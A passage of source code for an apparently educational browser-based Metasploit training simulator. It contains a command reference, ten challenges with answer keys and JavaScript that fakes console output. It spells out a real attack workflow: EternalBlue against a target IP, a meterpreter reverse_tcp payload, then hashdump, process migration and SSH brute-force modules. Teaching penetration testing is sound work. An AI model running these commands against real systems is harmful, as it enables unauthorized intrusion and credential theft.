                                <div class="ref-item" onclick="insertCommand('exploit')">
                                    <div class="command-syntax">exploit</div>
                                    <div class="command-explanation">Run the configured exploit</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('run')">
                                    <div class="command-syntax">run</div>
                                    <div class="command-explanation">Alternative to 'exploit' (same function)</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('exploit -j')">
                                    <div class="command-syntax">exploit -j</div>
                                    <div class="command-explanation">Run as background job</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('check')">
                                    <div class="command-syntax">check</div>
                                    <div class="command-explanation">Check if target is vulnerable (no exploit)</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üéõÔ∏è Session Management</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('sessions')">
                                    <div class="command-syntax">sessions</div>
                                    <div class="command-explanation">List all active sessions</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('sessions -i ')">
                                    <div class="command-syntax">sessions -i [id]</div>
                                    <div class="command-explanation">Interact with specific session</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('sessions -k ')">
                                    <div class="command-syntax">sessions -k [id]</div>
                                    <div class="command-explanation">Kill a session</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('background')">
                                    <div class="command-syntax">background</div>
                                    <div class="command-explanation">Background current session (Ctrl+Z)</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üíª Meterpreter Commands</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('sysinfo')">
                                    <div class="command-syntax">sysinfo</div>
                                    <div class="command-explanation">Display target system information</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('getuid')">
                                    <div class="command-syntax">getuid</div>
                                    <div class="command-explanation">Show current user privileges</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('ps')">
                                    <div class="command-syntax">ps</div>
                                    <div class="command-explanation">List running processes</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('migrate ')">
                                    <div class="command-syntax">migrate [PID]</div>
                                    <div class="command-explanation">Move to different process for stability</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('hashdump')">
                                    <div class="command-syntax">hashdump</div>
                                    <div class="command-explanation">Dump password hashes (requires privileges)</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('screenshot')">
                                    <div class="command-syntax">screenshot</div>
                                    <div class="command-explanation">Capture target screen</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('shell')">
                                    <div class="command-syntax">shell</div>
                                    <div class="command-explanation">Drop into system command shell</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('download ')">
                                    <div class="command-syntax">download [remote] [local]</div>
                                    <div class="command-explanation">Download file from target</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üìä Auxiliary Modules</h3>
                            <div class="ref-grid">
                                <div class="ref-item" onclick="insertCommand('use auxiliary/scanner/portscan/tcp')">
                                    <div class="command-syntax">auxiliary/scanner/portscan/tcp</div>
                                    <div class="command-explanation">TCP port scanning</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('use auxiliary/scanner/smb/smb_version')">
                                    <div class="command-syntax">auxiliary/scanner/smb/smb_version</div>
                                    <div class="command-explanation">Detect SMB version</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('use auxiliary/scanner/http/http_version')">
                                    <div class="command-syntax">auxiliary/scanner/http/http_version</div>
                                    <div class="command-explanation">Fingerprint web servers</div>
                                </div>
                                <div class="ref-item" onclick="insertCommand('use auxiliary/scanner/ssh/ssh_login')">
                                    <div class="command-syntax">auxiliary/scanner/ssh/ssh_login</div>
                                    <div class="command-explanation">SSH brute force / credential testing</div>
                                </div>
                            </div>
                        </div>

                        <div class="ref-category">
                            <h3>üéì Common Workflows</h3>
                            <div class="code-block" style="cursor: default;">
                                <span class="comment"># Basic exploitation workflow</span><br>
                                <span class="command">search</span> ms17_010<br>
                                <span class="command">use</span> <span class="module">exploit/windows/smb/ms17_010_eternalblue</span><br>
                                <span class="command">show options</span><br>
                                <span class="command">set</span> <span class="option">RHOSTS</span> 192.168.1.100<br>
                                <span class="command">set</span> <span class="option">PAYLOAD</span> <span class="payload">windows/x64/meterpreter/reverse_tcp</span><br>
                                <span class="command">set</span> <span class="option">LHOST</span> 192.168.1.50<br>
                                <span class="command">exploit</span><br>
                                <br>
                                <span class="comment"># Once you have a Meterpreter session</span><br>
                                <span class="command">sysinfo</span><br>
                                <span class="command">getuid</span><br>
                                <span class="command">ps</span><br>
                                <span class="command">migrate</span> 1234<br>
                                <span class="command">hashdump</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- SETTINGS TAB -->
                <div id="settings" class="tab-content">
                    <div class="settings-container">
                        <div class="settings-section">
                            <h3>Progress Management</h3>
                            <p style="color: #d0d0d0; margin-bottom: 15px;">Export your progress to save your challenge completions, or import previously saved progress.</p>
                            <button class="settings-btn" onclick="exportProgress()">üì• Export Progress</button>
                            <button class="settings-btn secondary" onclick="document.getElementById('importFile').click()">üì§ Import Progress</button>
                            <input type="file" id="importFile" style="display: none;" accept=".json" onchange="importProgress(event)">
                        </div>

                        <div class="settings-section">
                            <h3>Statistics</h3>
                            <div class="stat-item">
                                <span class="stat-label">Challenges Completed</span>
                                <span class="stat-value" id="statsCompleted">0</span>
                            </div>
                            <div class="stat-item">
                                <span class="stat-label">Total Points Earned</span>
                                <span class="stat-value" id="statsPoints">0</span>
                            </div>
                            <div class="stat-item">
                                <span class="stat-label">Commands Executed</span>
                                <span class="stat-value" id="statsCommands">0</span>
                            </div>
                            <div class="stat-item">
                                <span class="stat-label">Modules Explored</span>
                                <span class="stat-value" id="statsModules">0</span>
                            </div>
                        </div>

                        <div class="settings-section">
                            <h3>Reset Progress</h3>
                            <p style="color: #d0d0d0; margin-bottom: 15px;">Warning: This will clear all challenge completions and reset your statistics. This action cannot be undone unless you've exported your progress.</p>
                            <button class="settings-btn" style="background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);" onclick="resetProgress()">üîÑ Reset All Progress</button>
                        </div>

                        <div class="settings-section">
                            <h3>About This Lab</h3>
                            <p style="color: #d0d0d0; line-height: 1.8;">
                                This Metasploit Training Lab is an educational simulator designed to teach penetration testing concepts, Metasploit Framework architecture, and ethical hacking methodology in a safe, controlled environment. No actual exploitation occurs in this lab.
                                <br><br>
                                <strong style="color: #ef4444;">REMINDER:</strong> Real penetration testing requires written authorization, clearly defined rules of engagement, and strict adherence to legal and ethical guidelines. Unauthorized access to computer systems is illegal.
                                <br><br>
                                <strong style="color: #6366f1;">Version:</strong> 1.0.0<br>
                                <strong style="color: #6366f1;">Part of:</strong> Hexworth Prime - Dark Arts Vault
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- SIDEBAR -->
            <div class="sidebar">
                <div class="sidebar-section">
                    <h3>Quick Stats</h3>
                    <div class="stat-item">
                        <span class="stat-label">Progress</span>
                        <span class="stat-value"><span id="sidebarProgress">0</span>%</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">Completed</span>
                        <span class="stat-value"><span id="sidebarCompleted">0</span>/10</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">Points</span>
                        <span class="stat-value" id="sidebarPoints">0</span>
                    </div>
                </div>

                <div class="sidebar-section" id="currentModuleInfo" style="display: none;">
                    <h3>Current Module</h3>
                    <p style="font-family: 'Courier New', monospace; color: #22c55e; font-size: 0.85em; word-break: break-all;" id="modulePathDisplay"></p>
                    <p style="margin-top: 10px; font-size: 0.9em;" id="moduleDescription"></p>
                </div>

                <div class="sidebar-section">
                    <h3>Learning Tips</h3>
                    <div class="learning-tip">
                        <strong>üí° Start with Search</strong>
                        <p>Always begin by searching for modules related to your target. Use filters like <code>type:</code>, <code>platform:</code>, and <code>cve:</code> to narrow results.</p>
                    </div>
                </div>

                <div class="sidebar-section">
                    <h3>Key Concepts</h3>
                    <p style="font-size: 0.85em; line-height: 1.6;">
                        <strong style="color: #6366f1;">Exploit:</strong> How you get in<br>
                        <strong style="color: #6366f1;">Payload:</strong> What you do once inside<br>
                        <strong style="color: #6366f1;">RHOSTS:</strong> Target system(s)<br>
                        <strong style="color: #6366f1;">LHOST:</strong> Your attacking machine<br>
                        <strong style="color: #6366f1;">Meterpreter:</strong> Advanced post-exploitation shell
                    </p>
                </div>

                <div class="sidebar-section" id="contextualHelp">
                    <h3>Contextual Help</h3>
                    <p style="font-size: 0.85em; line-height: 1.6; color: #d0d0d0;">
                        As you work through challenges and execute commands, helpful context and tips will appear here.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ==================== STATE MANAGEMENT ====================
        let challenges = [];
        let currentModule = null;
        let currentModuleType = null;
        let terminalHistory = [];
        let commandCount = 0;
        let modulesExplored = new Set();
        let sessionActive = false;
        let currentSession = null;

        // Challenge definitions
        const challengeDefinitions = [
            {
                id: 1,
                title: 'Search for SMB Exploits',
                description: 'Use the search command to find modules related to SMB (Server Message Block) protocol.',
                hint: 'Try: search smb',
                solution: ['search smb', 'search type:exploit smb'],
                points: 10,
                completed: false
            },
            {
                id: 2,
                title: 'Select the EternalBlue Exploit',
                description: 'Use the "use" command to select the ms17_010_eternalblue exploit module.',
                hint: 'Format: use exploit/windows/smb/ms17_010_eternalblue',
                solution: ['use exploit/windows/smb/ms17_010_eternalblue'],
                points: 10,
                completed: false
            },
            {
                id: 3,
                title: 'Show Module Options',
                description: 'Display the configurable options for the currently selected module.',
                hint: 'Use the command that shows available options',
                solution: ['show options', 'options'],
                points: 10,
                completed: false
            },
            {
                id: 4,
                title: 'Set the Target Host',
                description: 'Configure RHOSTS (Remote Host) to target IP address 192.168.1.100',
                hint: 'Format: set RHOSTS [ip_address]',
                solution: ['set rhosts 192.168.1.100', 'set RHOSTS 192.168.1.100'],
                points: 15,
                completed: false
            },
            {
                id: 5,
                title: 'Configure Your Attack Machine',
                description: 'Set LHOST (Local Host) to your attacking machine IP: 192.168.1.50',
                hint: 'Similar to RHOSTS but use LHOST',
                solution: ['set lhost 192.168.1.50', 'set LHOST 192.168.1.50'],
                points: 15,
                completed: false
            },
            {
                id: 6,
                title: 'Understand Exploit vs Payload',
                description: 'In the Console Lab, type "info" to view module information. Notice the payload options. Which one is correct: The payload runs BEFORE the exploit, or AFTER?',
                hint: 'Think about the order: First you exploit a vulnerability, then...',
                solution: ['after', 'payload runs after', 'payload runs after exploit', 'the payload runs after'],
                points: 15,
                completed: false
            },
            {
                id: 7,
                title: 'Choose a Payload',
                description: 'Set the PAYLOAD to windows/x64/meterpreter/reverse_tcp',
                hint: 'Format: set PAYLOAD [payload_path]',
                solution: ['set payload windows/x64/meterpreter/reverse_tcp', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp'],
                points: 20,
                completed: false
            },
            {
                id: 8,
                title: 'List Active Sessions',
                description: 'Use the sessions command to view all active exploitation sessions.',
                hint: 'Just type: sessions',
                solution: ['sessions', 'sessions -l'],
                points: 10,
                completed: false
            },
            {
                id: 9,
                title: 'Use an Auxiliary Scanner',
                description: 'Switch to an auxiliary module: auxiliary/scanner/portscan/tcp',
                hint: 'Use the same "use" command but with the auxiliary path',
                solution: ['use auxiliary/scanner/portscan/tcp'],
                points: 15,
                completed: false
            },
            {
                id: 10,
                title: 'Understand Staged vs Stageless',
                description: 'What character separates stages in a staged payload name: forward slash (/) or underscore (_)?',
                hint: 'Look at: windows/meterpreter/reverse_tcp vs windows/meterpreter_reverse_tcp',
                solution: ['/', 'forward slash', 'slash', 'forward slash /'],
                points: 20,
                completed: false
            }
        ];

        // Module database (educational examples only)
        const moduleDatabase = {
            'exploit/windows/smb/ms17_010_eternalblue': {
                name: 'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption',
                type: 'exploit',
                platform: 'windows',
                rank: 'Average',
                description: 'This module exploits a vulnerability in Microsoft Server Message Block 1.0 (SMBv1). The vulnerability exists in the SMB implementation and can be triggered by sending a specially crafted packet.',
                references: ['CVE-2017-0144', 'MS17-010'],
                options: {
                    'RHOSTS': { required: true, description: 'Target address range or CIDR', default: '' },
                    'RPORT': { required: true, description: 'Target port', default: '445' },
                    'LHOST': { required: false, description: 'Listener address', default: '' },
                    'LPORT': { required: false, description: 'Listener port', default: '4444' },
                    'PAYLOAD': { required: false, description: 'Payload to execute', default: 'windows/x64/meterpreter/reverse_tcp' }
                },
                payloads: [
                    'windows/x64/meterpreter/reverse_tcp',
                    'windows/x64/meterpreter/reverse_https',
                    'windows/x64/shell/reverse_tcp',
                    'windows/meterpreter/reverse_tcp'
                ]
            },
            'exploit/multi/handler': {
                name: 'Generic Payload Handler',
                type: 'exploit',
                platform: 'multi',
                rank: 'Manual',
                description: 'This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.',
                references: [],
                options: {
                    'LHOST': { required: true, description: 'The listen address', default: '0.0.0.0' },
                    'LPORT': { required: true, description: 'The listen port', default: '4444' },
                    'PAYLOAD': { required: true, description: 'Payload to use', default: 'windows/meterpreter/reverse_tcp' }
                },
                payloads: ['generic/shell_reverse_tcp', 'windows/meterpreter/reverse_tcp', 'linux/x64/meterpreter/reverse_tcp']
            },
            'auxiliary/scanner/portscan/tcp': {
                name: 'TCP Port Scanner',
                type: 'auxiliary',
                description: 'Enumerate open TCP services by performing a full TCP connect on each port.',
                options: {
                    'RHOSTS': { required: true, description: 'Target address range', default: '' },
                    'PORTS': { required: true, description: 'Ports to scan (e.g. 22-25,80,110-900)', default: '1-10000' },
                    'THREADS': { required: false, description: 'Number of concurrent threads', default: '1' }
                }
            },
            'auxiliary/scanner/smb/smb_version': {
                name: 'SMB Version Detection',
                type: 'auxiliary',
                description: 'Detect the SMB version running on remote targets.',
                options: {
                    'RHOSTS': { required: true, description: 'Target address range', default: '' },
                    'RPORT': { required: true, description: 'Target port', default: '445' }
                }
            },
            'auxiliary/scanner/http/http_version': {
                name: 'HTTP Version Detection',
                type: 'auxiliary',
                description: 'Detect HTTP server version and banner information.',
                options: {
                    'RHOSTS': { required: true, description: 'Target address range', default: '' },
                    'RPORT': { required: true, description: 'Target port', default: '80' },
                    'SSL': { required: false, description: 'Use SSL/TLS', default: 'false' }
                }
            }
        };

        // ==================== INITIALIZATION ====================
        document.addEventListener('DOMContentLoaded', () => {
            initializeChallenges();
            loadProgress();
            setupCommandInput();
            updateStats();
            renderChallenges();
        });

        function initializeChallenges() {
            challenges = [...challengeDefinitions];
        }

        function setupCommandInput() {
            const input = document.getElementById('commandInput');
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    executeCommand();
                }
            });
        }

        // ==================== TAB SWITCHING ====================
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });

            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');

            // Focus command input if console lab
            if (tabName === 'console-lab') {
                setTimeout(() => document.getElementById('commandInput').focus(), 100);
            }
        }

        // ==================== COMMAND EXECUTION ====================
        function executeCommand() {
            const input = document.getElementById('commandInput');
            const command = input.value.trim();

            if (!command) return;

            // Display command in terminal
            appendToTerminal(`<span class="prompt">msf6${currentModule ? ' ' + currentModule.name : ''} ></span> <span style="color: #22c55e;">${escapeHtml(command)}</span>`);

            // Clear input
            input.value = '';

            // Track stats
            commandCount++;
            saveProgress();

            // Process command
            processCommand(command.toLowerCase());

            // Check challenges
            checkChallengeCompletion(command.toLowerCase());

            // Update stats
            updateStats();
        }

        function processCommand(command) {
            const cmd = command.split(' ')[0];
            const args = command.substring(cmd.length).trim();

            switch(cmd) {
                case 'help':
                    showHelp();
                    break;
                case 'search':
                    searchModules(args);
                    break;
                case 'use':
                    useModule(args);
                    break;
                case 'info':
                    showInfo();
                    break;
                case 'show':
                    showCommand(args);
                    break;
                case 'set':
                    setOption(args);
                    break;
                case 'setg':
                    setOption(args, true);
                    break;
                case 'unset':
                    unsetOption(args);
                    break;
                case 'exploit':
                case 'run':
                    runExploit();
                    break;
                case 'check':
                    checkVulnerability();
                    break;
                case 'back':
                    backToMain();
                    break;
                case 'sessions':
                    showSessions(args);
                    break;
                case 'clear':
                    clearTerminal();
                    break;
                case 'exit':
                    appendToTerminal('<span class="terminal-output info">In a real environment, this would exit msfconsole. In this lab, use the Back button to navigate.</span>');
                    break;
                default:
                    appendToTerminal(`<span class="terminal-output error">[-] Unknown command: ${escapeHtml(cmd)}. Type 'help' for available commands.</span>`);
            }
        }

        function showHelp() {
            appendToTerminal(`
<span class="terminal-output info">Core Commands
=============

    Command       Description
    -------       -----------
    help          Display this help message
    search        Search for modules by keyword
    use           Select a module to configure
    info          Show information about current module
    show          Display various module details (options, payloads, etc)
    set           Set an option value
    setg          Set a global option value
    unset         Clear an option value
    exploit       Execute the configured module
    run           Alias for 'exploit'
    check         Check if target is vulnerable
    back          Return to main console
    sessions      List or interact with sessions
    clear         Clear terminal screen
    exit          Exit msfconsole

Type 'search [keyword]' to find modules or 'use [module_path]' to select one.</span>
            `);
        }

        function searchModules(query) {
            if (!query) {
                appendToTerminal('<span class="terminal-output error">[-] You must specify search criteria. Try: search smb</span>');
                return;
            }

            appendToTerminal('<span class="terminal-output info">[*] Searching module database...</span>');

            // Parse search filters
            let searchType = null;
            let searchPlatform = null;
            let searchKeyword = query;

            if (query.includes('type:')) {
                const match = query.match(/type:(\w+)/);
                if (match) searchType = match[1];
            }
            if (query.includes('platform:')) {
                const match = query.match(/platform:(\w+)/);
                if (match) searchPlatform = match[1];
            }

            // Simple search implementation
            let results = Object.entries(moduleDatabase).filter(([path, module]) => {
                if (searchType && module.type !== searchType) return false;
                if (searchPlatform && module.platform !== searchPlatform) return false;
                return path.toLowerCase().includes(query.toLowerCase()) ||
                       module.name.toLowerCase().includes(query.toLowerCase());
            });

            if (results.length === 0) {
                appendToTerminal('<span class="terminal-output warning">[-] No results found.</span>');
                return;
            }

            appendToTerminal(`<span class="terminal-output success">[+] Found ${results.length} module(s):</span>`);
            appendToTerminal('<span class="terminal-output">');
            results.forEach(([path, module]) => {
                appendToTerminal(`   ${module.rank.padEnd(12)} ${path.padEnd(50)} ${module.name}`);
            });
            appendToTerminal('</span>');
        }

        function useModule(path) {
            if (!path) {
                appendToTerminal('<span class="terminal-output error">[-] You must specify a module path. Try: use exploit/windows/smb/ms17_010_eternalblue</span>');
                return;
            }

            const module = moduleDatabase[path];
            if (!module) {
                appendToTerminal(`<span class="terminal-output error">[-] Module not found: ${escapeHtml(path)}</span>`);
                appendToTerminal('<span class="terminal-output info">[*] Tip: Use "search" to find available modules</span>');
                return;
            }

            currentModule = { path, ...module, name: path.split('/').pop(), options: { ...module.options } };
            modulesExplored.add(path);

            appendToTerminal(`<span class="terminal-output success">[+] Using module: ${escapeHtml(path)}</span>`);
            appendToTerminal(`<span class="terminal-output info">[*] Type 'info' for details or 'show options' to configure</span>`);

            // Update sidebar
            document.getElementById('currentModuleInfo').style.display = 'block';
            document.getElementById('modulePathDisplay').textContent = path;
            document.getElementById('moduleDescription').textContent = module.description;

            updateContextualHelp(`You've selected the ${module.name} module. Next, configure required options with 'show options' then 'set [OPTION] [value]'.`);
        }

        function showInfo() {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output error">[-] No module selected. Use "use [module_path]" first.</span>');
                return;
            }

            appendToTerminal(`
<span class="terminal-output info">
       Name: ${currentModule.name}
     Module: ${currentModule.path}
   Platform: ${currentModule.platform}
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: ${currentModule.rank}

Provided by:
  Educational Lab Simulator

Available targets:
  Id  Name
  --  ----
  0   Automatic Target

Check supported:
  Yes

Basic options:
${Object.entries(currentModule.options).map(([key, opt]) =>
    `  ${key.padEnd(15)} ${opt.required ? 'yes' : 'no '}  ${opt.default || ''}  ${opt.description}`
).join('\n')}

Description:
  ${currentModule.description}

References:
  ${currentModule.references ? currentModule.references.join('\n  ') : 'None'}
</span>
            `);
        }

        function showCommand(args) {
            if (!args) {
                appendToTerminal('<span class="terminal-output error">[-] You must specify what to show (options, payloads, targets)</span>');
                return;
            }

            const showType = args.toLowerCase();

            if (showType === 'options') {
                if (!currentModule) {
                    appendToTerminal('<span class="terminal-output error">[-] No module selected. Use "use [module_path]" first.</span>');
                    return;
                }

                appendToTerminal(`
<span class="terminal-output info">Module options (${currentModule.path}):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
${Object.entries(currentModule.options).map(([key, opt]) => {
    const current = opt.currentValue || opt.default || '';
    return `   ${key.padEnd(10)} ${String(current).padEnd(17)} ${opt.required ? 'yes' : 'no '}       ${opt.description}`;
}).join('\n')}
</span>
                `);
            } else if (showType === 'payloads') {
                if (!currentModule || !currentModule.payloads) {
                    appendToTerminal('<span class="terminal-output error">[-] No compatible payloads for this module type.</span>');
                    return;
                }

                appendToTerminal('<span class="terminal-output info">Compatible Payloads:\n');
                currentModule.payloads.forEach(payload => {
                    appendToTerminal(`   ${payload}`);
                });
                appendToTerminal('</span>');
            } else if (showType === 'targets') {
                appendToTerminal(`
<span class="terminal-output info">Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   Windows 7 SP1 x64
   2   Windows Server 2008 R2 SP1 x64
</span>
                `);
            } else {
                appendToTerminal(`<span class="terminal-output error">[-] Unknown show option: ${escapeHtml(args)}</span>`);
            }
        }

        function setOption(args, global = false) {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output error">[-] No module selected. Use "use [module_path]" first.</span>');
                return;
            }

            const parts = args.split(' ');
            if (parts.length < 2) {
                appendToTerminal('<span class="terminal-output error">[-] Usage: set [OPTION] [value]</span>');
                return;
            }

            const option = parts[0].toUpperCase();
            const value = parts.slice(1).join(' ');

            if (currentModule.options[option] || option === 'PAYLOAD') {
                if (currentModule.options[option]) {
                    currentModule.options[option].currentValue = value;
                } else {
                    currentModule.options[option] = { currentValue: value, required: false, description: 'Payload to use' };
                }
                appendToTerminal(`<span class="terminal-output success">[+] ${option} => ${escapeHtml(value)}</span>`);

                if (option === 'RHOSTS') {
                    updateContextualHelp(`Target set to ${value}. Remember to also set LHOST (your attacking machine IP) and optionally choose a PAYLOAD.`);
                } else if (option === 'LHOST') {
                    updateContextualHelp(`Listener configured at ${value}. You're ready to run the exploit with 'exploit' or 'run'.`);
                } else if (option === 'PAYLOAD') {
                    updateContextualHelp(`Payload selected: ${value}. This is what will execute on the target after successful exploitation.`);
                }
            } else {
                appendToTerminal(`<span class="terminal-output error">[-] Unknown option: ${option}</span>`);
            }
        }

        function unsetOption(args) {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output error">[-] No module selected.</span>');
                return;
            }

            const option = args.toUpperCase();
            if (currentModule.options[option]) {
                currentModule.options[option].currentValue = '';
                appendToTerminal(`<span class="terminal-output success">[+] Unset ${option}</span>`);
            } else {
                appendToTerminal(`<span class="terminal-output error">[-] Unknown option: ${option}</span>`);
            }
        }

        function runExploit() {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output error">[-] No module selected. Use "use [module_path]" first.</span>');
                return;
            }

            // Check required options
            for (const [key, opt] of Object.entries(currentModule.options)) {
                if (opt.required && !opt.currentValue && !opt.default) {
                    appendToTerminal(`<span class="terminal-output error">[-] ${key} is required but not set. Use: set ${key} [value]</span>`);
                    return;
                }
            }

            appendToTerminal('<span class="terminal-output info">[*] Started reverse TCP handler on ' + (currentModule.options.LHOST?.currentValue || '0.0.0.0') + ':' + (currentModule.options.LPORT?.currentValue || '4444') + '</span>');
            appendToTerminal('<span class="terminal-output info">[*] Sending exploit packet...</span>');

            setTimeout(() => {
                appendToTerminal('<span class="terminal-output warning">[!] EDUCATIONAL SIMULATOR: No actual exploitation occurs in this lab</span>');
                appendToTerminal('<span class="terminal-output info">[*] In a real scenario, if successful, you would receive a Meterpreter session</span>');
                appendToTerminal('<span class="terminal-output success">[+] Simulated session 1 opened</span>');
                sessionActive = true;
                currentSession = { id: 1, type: 'meterpreter', target: currentModule.options.RHOSTS?.currentValue || 'unknown' };

                updateContextualHelp('In a real penetration test, you now have access to the target system. You would use Meterpreter commands like sysinfo, getuid, ps, hashdump, etc. Remember: Always operate within authorized scope!');
            }, 1500);
        }

        function checkVulnerability() {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output error">[-] No module selected.</span>');
                return;
            }

            appendToTerminal('<span class="terminal-output info">[*] Checking if target is vulnerable...</span>');
            setTimeout(() => {
                appendToTerminal('<span class="terminal-output success">[+] The target appears to be vulnerable (simulated result)</span>');
                updateContextualHelp('The "check" command is safer than running a full exploit - it tests for vulnerability without attempting exploitation. Always check first when possible!');
            }, 1000);
        }

        function backToMain() {
            if (!currentModule) {
                appendToTerminal('<span class="terminal-output info">[*] Already at main console</span>');
                return;
            }

            currentModule = null;
            sessionActive = false;
            document.getElementById('currentModuleInfo').style.display = 'none';
            appendToTerminal('<span class="terminal-output info">[*] Returned to main console</span>');
        }

        function showSessions(args) {
            if (!sessionActive) {
                appendToTerminal('<span class="terminal-output warning">[-] No active sessions.</span>');
                return;
            }

            appendToTerminal(`
<span class="terminal-output info">Active sessions
===============

  Id  Name  Type         Information            Connection
  --  ----  ----         -----------            ----------
  1         meterpreter  SIMULATOR\\user @ SIM   192.168.1.50:4444 -> ${currentSession.target}:445 (simulated)
</span>
            `);
        }

        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '';
            appendToTerminal('<span class="terminal-output info">Terminal cleared. Type "help" for available commands.</span>');
        }

        function loadScenario(type) {
            clearTerminal();
            if (type === 'beginner') {
                appendToTerminal('<span class="terminal-output success">[+] Loaded Beginner Scenario</span>');
                appendToTerminal('<span class="terminal-output info">[*] Goal: Learn basic Metasploit workflow</span>');
                appendToTerminal('<span class="terminal-output info">[*] Try: search smb ‚Üí use exploit/windows/smb/ms17_010_eternalblue</span>');
            } else {
                appendToTerminal('<span class="terminal-output success">[+] Loaded Advanced Scenario</span>');
                appendToTerminal('<span class="terminal-output info">[*] Goal: Explore auxiliary modules and session management</span>');
                appendToTerminal('<span class="terminal-output info">[*] Try: use auxiliary/scanner/portscan/tcp</span>');
            }
        }

        function appendToTerminal(html) {
            const terminal = document.getElementById('terminal');
            const div = document.createElement('div');
            div.className = 'terminal-output';
            div.innerHTML = html;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function updateContextualHelp(message) {
            document.getElementById('contextualHelp').innerHTML = `
                <h3>Contextual Help</h3>
                <p style="font-size: 0.85em; line-height: 1.6; color: #d0d0d0;">${message}</p>
            `;
        }

        // ==================== CHALLENGES ====================
        function renderChallenges() {
            const container = document.getElementById('challengeList');
            container.innerHTML = challenges.map(challenge => `
                <div class="challenge-card ${challenge.completed ? 'completed' : ''}" id="challenge-${challenge.id}">
                    <div class="challenge-header">
                        <div class="challenge-title">${challenge.title}</div>
                        <div class="challenge-status">${challenge.completed ? '‚úì Completed' : challenge.points + ' points'}</div>
                    </div>
                    <div class="challenge-description">${challenge.description}</div>
                    <div class="challenge-hint">üí° Hint: ${challenge.hint}</div>
                    ${!challenge.completed ? `
                    <div class="challenge-input">
                        <input type="text" placeholder="Enter your answer..." id="answer-${challenge.id}">
                        <button onclick="checkChallenge(${challenge.id})">Submit</button>
                    </div>
                    ` : ''}
                </div>
            `).join('');
        }

        function checkChallenge(id) {
            const challenge = challenges.find(c => c.id === id);
            const input = document.getElementById(`answer-${id}`);
            const answer = input.value.trim().toLowerCase();

            if (challenge.solution.some(sol => answer === sol.toLowerCase())) {
                challenge.completed = true;
                renderChallenges();
                updateProgress();
                saveProgress();

                // Show success notification
                alert(`‚úì Challenge completed! +${challenge.points} points`);
            } else {
                alert('Not quite right. Try again or check the hint!');
            }
        }

        function checkChallengeCompletion(command) {
            challenges.forEach(challenge => {
                if (!challenge.completed) {
                    if (challenge.solution.some(sol => command.includes(sol.toLowerCase()))) {
                        challenge.completed = true;
                        renderChallenges();
                        updateProgress();
                        saveProgress();
                    }
                }
            });
        }

        function updateProgress() {
            const completed = challenges.filter(c => c.completed).length;
            const total = challenges.length;
            const percentage = (completed / total) * 100;
            const points = challenges.filter(c => c.completed).reduce((sum, c) => sum + c.points, 0);

            document.getElementById('progressBar').style.width = percentage + '%';
            document.getElementById('completedCount').textContent = completed;
            document.getElementById('totalChallenges').textContent = total;
            document.getElementById('totalPoints').textContent = points + ' points';
        }

        // ==================== REFERENCE ====================
        function insertCommand(command) {
            const activeTab = document.querySelector('.tab.active').textContent;

            if (activeTab.includes('Console Lab')) {
                document.getElementById('commandInput').value = command;
                document.getElementById('commandInput').focus();
            } else {
                // Switch to console lab
                switchTab('console-lab');
                setTimeout(() => {
                    document.getElementById('commandInput').value = command;
                    document.getElementById('commandInput').focus();
                }, 100);
            }
        }

        // ==================== SETTINGS & PROGRESS ====================
        function updateStats() {
            const completed = challenges.filter(c => c.completed).length;
            const points = challenges.filter(c => c.completed).reduce((sum, c) => sum + c.points, 0);
            const percentage = Math.round((completed / challenges.length) * 100);

            // Update sidebar
            document.getElementById('sidebarProgress').textContent = percentage;
            document.getElementById('sidebarCompleted').textContent = completed;
            document.getElementById('sidebarPoints').textContent = points;

            // Update settings stats
            document.getElementById('statsCompleted').textContent = completed;
            document.getElementById('statsPoints').textContent = points;
            document.getElementById('statsCommands').textContent = commandCount;
            document.getElementById('statsModules').textContent = modulesExplored.size;
        }

        function saveProgress() {
            const progress = {
                challenges: challenges.map(c => ({ id: c.id, completed: c.completed })),
                commandCount: commandCount,
